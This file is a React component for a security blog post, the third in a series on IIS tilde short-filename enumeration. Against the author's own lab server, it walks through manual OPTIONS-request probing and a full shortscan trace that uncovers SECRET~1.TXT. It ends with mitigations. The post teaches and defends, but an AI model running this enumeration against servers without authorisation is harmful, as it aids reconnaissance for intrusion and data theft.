import { Container, Divider, Typography } from "@mui/material";
import Box from "@mui/material/Box";
import styles from "../../styles/Home.module.css";
import React, { useState } from "react";
import SyntaxHighlighter from "react-syntax-highlighter";

const IIS_TILDE_ENUMERATION_PART_3 = () => {

    const syntax_1 = `
    method=OPTIONS status=404 url="http://35.171.23.79/*~1*/"
    method=OPTIONS status=200 url="http://35.171.23.79/*~0*/"
    method=OPTIONS status=200 url="http://35.171.23.79/*~2*/"
    method=OPTIONS status=200 url="http://35.171.23.79/*~3*/"
    method=OPTIONS status=200 url="http://35.171.23.79/*~4*/"`

    const syntax_2 = `
    /*~1*/ - 1 Vulnerable file/folder
    /*~2*/ - 2 Vulnerable file/folder
    /*~3*/ - 3 Vulnerable file/folder
    /*~4*/ - 4 Vulnerable file/folder
    ...`

    const syntax_3 = `
    shelled@DESKTOP-N4LUQAK:~$ shortscan http://35.171.23.79/ -v 2
    Shortscan v0.6 · an IIS short filename enumeration tool by bitquark
    INFO Using built-in wordlist
    INFO Rainbow table provided, enabling auto dechecksumming
    Target: http://35.171.23.79/
    TRACE fetch()                                       method=GET status=404 url="http://35.171.23.79/.aspx"
    Running: Microsoft-IIS/10.0
    TRACE fetch()                                       method=_ status=405 url="http://35.171.23.79/"
    INFO Using method-based file existence checks
    TRACE fetch()                                       method=OPTIONS status=200 url="http://35.171.23.79/*6*/"
    TRACE fetch()                                       method=OPTIONS status=200 url="http://35.171.23.79/*5*/"
    TRACE fetch()                                       method=OPTIONS status=200 url="http://35.171.23.79/*5*/"
    TRACE fetch()                                       method=OPTIONS status=200 url="http://35.171.23.79/*9*/"
    TRACE fetch()                                       method=OPTIONS status=404 url="http://35.171.23.79/*~1*/"
    TRACE fetch()                                       method=OPTIONS status=200 url="http://35.171.23.79/*~0*/"
    TRACE fetch()                                       method=OPTIONS status=200 url="http://35.171.23.79/*~2*/"
    TRACE fetch()                                       method=OPTIONS status=200 url="http://35.171.23.79/*~3*/"
    TRACE fetch()                                       method=OPTIONS status=200 url="http://35.171.23.79/*~4*/"
    Vulnerable: Yes!
    INFO Found working options                         method=OPTIONS statusNeg=200 statusPos=404 suffix=/
    INFO Found tilde files                             tildes="[~1]"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*J*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*F*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*K*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*G*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*O*~1*/"
    TRACE fetch()                   method=OPTIONS status=404 url="http://35.171.23.79/*T*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*M*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*Y*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*V*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*H*~1*/"
    TRACE fetch()                   method=OPTIONS status=404 url="http://35.171.23.79/*S*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*P*~1*/"
    TRACE fetch()                   method=OPTIONS status=404 url="http://35.171.23.79/*C*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*A*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*N*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*D*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*X*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*L*~1*/"
    TRACE fetch()                   method=OPTIONS status=404 url="http://35.171.23.79/*R*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*W*~1*/"
    TRACE fetch()                   method=OPTIONS status=404 url="http://35.171.23.79/*E*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*B*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*Q*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*U*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*I*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*Z*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*8*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*5*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*4*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*9*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*1*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*7*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*6*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*3*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*2*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*0*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*-*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*_*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*%28*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*%29*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*%26*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*%27*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*%21*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*%23*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*%24*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*%25*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*%40*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*%5E*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*%7B*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*%7D*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*J*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*F*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*K*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*G*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*O*/"
    TRACE fetch()                   method=OPTIONS status=404 url="http://35.171.23.79/*~1*T*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*M*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*Y*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*V*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*H*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*S*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*P*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*C*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*A*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*N*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*D*/"
    TRACE fetch()                   method=OPTIONS status=404 url="http://35.171.23.79/*~1*X*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*L*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*R*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*W*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*E*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*B*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*Q*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*U*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*I*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*Z*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*8*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*5*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*4*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*9*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*7*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*6*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*3*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*2*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*0*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*-*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*_*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*%28*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*%29*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*%26*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*%27*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*%21*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*%23*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*%24*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*%25*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*%40*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*%5E*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*%7B*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*%7D*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/*~1*~*/"
    INFO Built character set        extChars="map[~1:TX]" fileChars="map[~1:TSCRE]"
    --------------------------------------------------------------------------------
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/E*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/C*~1*/"
    TRACE fetch()                   method=OPTIONS status=404 url="http://35.171.23.79/S*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/S~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/T*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/R*~1*/"
    TRACE fetch()                   method=OPTIONS status=404 url="http://35.171.23.79/S%3f*~1*/"
    TRACE fetch()                   method=OPTIONS status=404 url="http://35.171.23.79/SE*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SS*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SR*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SC*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SE~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/ST*~1*/"
    TRACE fetch()                   method=OPTIONS status=404 url="http://35.171.23.79/SE%3f*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SEE*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SES*~1*/"
    TRACE fetch()                   method=OPTIONS status=404 url="http://35.171.23.79/SEC*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SET*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SER*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SEC~1*/"
    TRACE fetch()                   method=OPTIONS status=404 url="http://35.171.23.79/SEC%3f*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SECS*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SECE*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SECC*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SECT*~1*/"
    TRACE fetch()                   method=OPTIONS status=404 url="http://35.171.23.79/SECR*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SECR~1*/"
    TRACE fetch()                   method=OPTIONS status=404 url="http://35.171.23.79/SECR%3f*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SECRS*~1*/"
    TRACE fetch()                   method=OPTIONS status=404 url="http://35.171.23.79/SECRE*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SECRT*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SECRC*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SECRE~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SECRR*~1*/"
    TRACE fetch()                   method=OPTIONS status=404 url="http://35.171.23.79/SECRE%3f*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SECREE*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SECRES*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SECRER*~1*/"
    TRACE fetch()                   method=OPTIONS status=404 url="http://35.171.23.79/SECRET*~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SECREC*~1*/"
    TRACE fetch()                   method=OPTIONS status=404 url="http://35.171.23.79/SECRET~1*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SECRET~1/"
    TRACE fetch()                   method=OPTIONS status=404 url="http://35.171.23.79/SECRET~1.T*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SECRET~1.X*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SECRET~1*.T/"
    TRACE fetch()                   method=OPTIONS status=404 url="http://35.171.23.79/SECRET~1.T%3f*/"
    TRACE fetch()                   method=OPTIONS status=404 url="http://35.171.23.79/SECRET~1.TX*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SECRET~1.TT*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SECRET~1*.TX/"
    TRACE fetch()                   method=OPTIONS status=404 url="http://35.171.23.79/SECRET~1.TX%3f*/"
    TRACE fetch()                   method=OPTIONS status=200 url="http://35.171.23.79/SECRET~1.TXX*/"
    TRACE fetch()                   method=OPTIONS status=404 url="http://35.171.23.79/SECRET~1.TXT*/"
    TRACE fetch()                   method=OPTIONS status=404 url="http://35.171.23.79/SECRET~1*.TXT/"
    TRACE fetch()                   method=OPTIONS status=404 url="http://35.171.23.79/SECRET~1.TXT/"
    SECRET~1.TXT         SECRET?.TXT?
    --------------------------------------------------------------------------------
    Finished! Requests: 167; Retries: 0; Sent 31884 bytes; Received 65590 bytes`

    return (
        <Box
            className={styles.container}
            sx={{ backgroundColor: "primary.background_website" }}
            pt={5}
        >
            <Container>
                <Typography
                    sx={{
                        color: "primary.main",
                    }}
                >
                    <Typography mb={-2} variant="h2">
                     IIS Tilde Enumeration: Part 3
                    </Typography>
                    <pre>2023/08/17 8:46PM</pre>
                    <Divider color="#42403f" />
                    <Typography mt={6} variant="h5">
                        Description
                    </Typography>
                    <Typography>
                    In the first blog post on IIS Tilde Enumeration we setup an IIS webserver on Windows Server 2022 using Amazon EC2. In the second post we explored IIS tilde enumeration and how this can lead to a vulnerability. In the this blog post we will explore how IIS tilde requests are being sent and how to mitigate.
                    </Typography>
                    <Box mt={5}/>
                    <Typography>
                    You may be wondering why it is called IIS tilde enumeration. After all, the tilde `~` symbol hasn't even been seen... Until now. We will start off where we left off with a file in the webroot called `secretcredentials.txt`.
                    </Typography>
                    <img src="/iis_3_1.png" style={{width: "100%", height: "100%"}}  />
                    <img src="/iis_3_2.png" style={{width: "100%", height: "100%"}}  />
                    <Box mt={5}/>
                    <Typography mt={6} variant="h5">
                    Finding Number of Vulnerable Files/Folders
                    </Typography>
                    <Typography>
                    When we run this tool https://github.com/bitquark/shortscan. What exactly is happening?
                    </Typography>
                    <img src="/iis_3_3.png" style={{width: "100%", height: "100%"}}  />
                    <Box mt={5}/>
                    <Typography>
                    First, we check to see if the IIS server contains a vulnerable file/folder. At this time we are also checking how many vulnerable files/folders are available (in the webroot). The is done by sending the OPTIONS method with `/*~1*/` in the request. 
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="http">
                        {syntax_1}
                    </SyntaxHighlighter>
                    <Box mt={5}/>
                    <Typography>
                    If the status returned from the request is `404`, then that means we have that number of vulnerable files/folders.
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="http">
                        {syntax_2}
                    </SyntaxHighlighter>
                    <Box mt={5}/>
                    <Typography>
                    We have 1 vulnerable file/folder on this IIS machine because of 404 status code sent with `/*~1*/` (secretcredentials.txt)
                    </Typography>
                    <img src="/iis_3_4.png" style={{width: "100%", height: "100%"}}  />
                    <Box mt={5}/>
                    <Typography>
                    We do not have 3 files/folders vulnerable on this IIS machine because of 200 status code sent with `/*~3*/`
                    </Typography>
                    <img src="/iis_3_5.png" style={{width: "100%", height: "100%"}}  />
                    <Box mt={5}/>
                    <Typography mt={6} variant="h5">
                    Finding Letters in Short Name
                    </Typography>
                    <Typography>
                    The same rules apply to finding the names of short name files. We will send an OPTIONS request but this time we will enumerate over the alphabet one-by-one until we get a 404 status code. Note that a 404 status code indicates that the letter exists, while a 200 status code indicates that a letter does not exists. This seem backwards, but just work with it.
                    </Typography>
                    <Box mt={5}/>
                    <Typography>
                    Since IIS is not case sensitive, we will only need to send either upper-case or lower-case letters. I will be sending uppercase letters starting from 'A' then going through the alphabet until we hit a 404.
                    </Typography>
                    <Box mt={5}/>
                    <Typography>
                    Sending this request, notice that the 'A' character does not exist (as the first letter to the vulnerable file) due to the 404 status code. Also notice that we are sending the number of vulnerable files/folders in the request as well `/A*~1*/`.
                    </Typography>
                    <img src="/iis_3_6.png" style={{width: "100%", height: "100%"}}  />
                    <Box mt={5}/>
                    <Typography>
                    The character 'B' does not exist (as the first letter to the vulnerable file).
                    </Typography>
                    <img src="/iis_3_7.png" style={{width: "100%", height: "100%"}}  />
                    <Box mt={5}/>
                    <Typography>
                    The character 'S' is the first letter to the vulnerable file.
                    </Typography>
                    <img src="/iis_3_8.png" style={{width: "100%", height: "100%"}}  />
                    <Box mt={5}/>
                    <Typography>
                    We now need to find the second letter. To do this we will follow the same process. As you can see below, the character 'A' is not the second character in the file name.
                    </Typography>
                    <img src="/iis_3_9.png" style={{width: "100%", height: "100%"}}  />
                    <Box mt={5}/>
                    <Typography>
                    The character 'E' is the second letter in the file name.
                    </Typography>
                    <img src="/iis_3_10.png" style={{width: "100%", height: "100%"}}  />
                    <Box mt={5}/>
                    <Typography>
                    We can keep following this process until the whole short name is found.
                    </Typography>
                    <img src="/iis_3_11.png" style={{width: "100%", height: "100%"}}  />
                    <Box mt={5}/>
                    <img src="/iis_3_12.png" style={{width: "100%", height: "100%"}}  />
                    <Box mt={5}/>
                    <Typography mt={6} variant="h5">
                    Finding the Extension
                    </Typography>
                    <Typography>
                    We have identified that the 6 character of the short name is `SECRET~1`. We will now identify the 3 characters of the short name's extension. Identifying the extension is a similar process, but we need to have "filler" `%3f` characters in the extension.
                    </Typography>
                    <Box mt={5}/>
                    <Typography>
                    "Filler" %3f characters
                    </Typography>
                    <img src="/iis_3_13.png" style={{width: "100%", height: "100%"}}  />
                    <Box mt={5}/>
                    <Typography>
                    No "filler" %3f characters
                    </Typography>
                    <img src="/iis_3_14.png" style={{width: "100%", height: "100%"}}  />
                    <Box mt={5}/>
                    <Typography>
                    We can do the same process as before and we will eventually end up here:
                    </Typography>
                    <img src="/iis_3_15.png" style={{width: "100%", height: "100%"}}  />
                    <Box mt={5}/>
                    <Typography>
                    We have successfully manually identified that there is a vulnerable short name file with the name of `SECRET~1.TXT`
                    </Typography>
                    <img src="/iis_3_16.png" style={{width: "100%", height: "100%"}}  />
                    <Box mt={5}/>
                    <Typography>
                    With this information we can use the various methods in blog 2 to fuzz for `secret*.txt`. 
                    </Typography>
                    <img src="/iis_3_17.png" style={{width: "100%", height: "100%"}}  />
                    <Box mt={5}/>
                    <Typography mt={6} variant="h5">
                    Mitigations
                    </Typography>
                    <Typography>
                    To mitigate IIS Tilde enumeration we can disable the creation of MS-DOS compatible short names. This can be done by changing the value of `HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreation` in the Windows registry to 1.
                    </Typography>
                    <img src="/iis_3_18.png" style={{width: "100%", height: "100%"}}  />
                    <Box mt={5}/>
                    <Typography>
                    I will now create a new file called `secretcredentials2.txt`. Notice that the `secretcredentials.txt` still has its short name.
                    </Typography>
                    <img src="/iis_3_19.png" style={{width: "100%", height: "100%"}}  />
                    <Box mt={5}/>
                    <Typography>
                    In addition to disabling the creation of short names, it is also recommended to set firewall rules for tilde (~) symbol in requests. As you learned in this blog post, blocking the tilde (~) symbol will stop IIS enumeration attacks.
                    </Typography>
                    <Box mt={5}/>
                    <Typography mt={6} variant="h5">
                    Trace
                    </Typography>
                    <Typography>
                    I will end this blog post with the trace (verbocity = 2) on the shortname scanner tool.
                    </Typography>
                    <img src="/iis_3_20.png" style={{width: "100%", height: "100%"}}  />
                    <Box mt={5}/>
                    <SyntaxHighlighter className="syntax" language="http">
                        {syntax_3}
                    </SyntaxHighlighter>
                    <Box pt={25}/>
                </Typography>
            </Container>
        </Box>
    );
};

export default IIS_TILDE_ENUMERATION_PART_3;
